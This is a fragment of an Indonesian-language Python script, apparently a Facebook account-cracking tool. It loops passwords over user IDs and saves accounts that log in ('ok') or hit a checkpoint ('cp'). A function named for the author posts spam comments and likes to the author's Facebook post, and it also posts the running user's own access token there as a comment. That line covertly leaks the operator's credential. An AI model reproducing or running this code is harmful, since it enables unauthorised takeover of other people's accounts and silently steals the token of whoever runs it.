...
Kang   =  100081776700670
Postingan =  100272939375263
...
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Kang)];self.komen = ['Mantap Bang @[100081776700670:0]','SC lu GG bang @[100081776700670:0]','Bang mantanya icahdella ya? @[100081776700670:0]','Semoga langgeng bang sama si Dinda @[100081776700670:0]','Ganteng banget🥰🥰💕']
...
def ___Asep___Sayang___Kamu___Dinda___():
    try:
        ...
        komentar = komtwol
        pipp = kartu2d
        post = '100272939375263'
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/100272939375263/likes?summary=true&access_token=' + (token),cookies=cookie)
...
def fii_xd():
	...
	if fiisayangwidiya in [""]:
		...
		jalan(f"{B}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		_checkoptions_=input(f"{B}[•] Pilih : {P}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
...
def started():
    print(f"{B}[•]{P} Results {I}ok {P}tersimpan di {I}ok/{tanggal}")
    print(f"{B}[•]{P} Results {K}cp {P}tersimpan di {K}cp/{tanggal}")
    print(f"{B}[•] Jika tidak hasil pindahkan kartu SIM dulu")
    print(f"{B}================================================={P}")
...
def api(uid, fii):
    ...
    sys.stdout.write(f"\r{B}[•] > {P} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
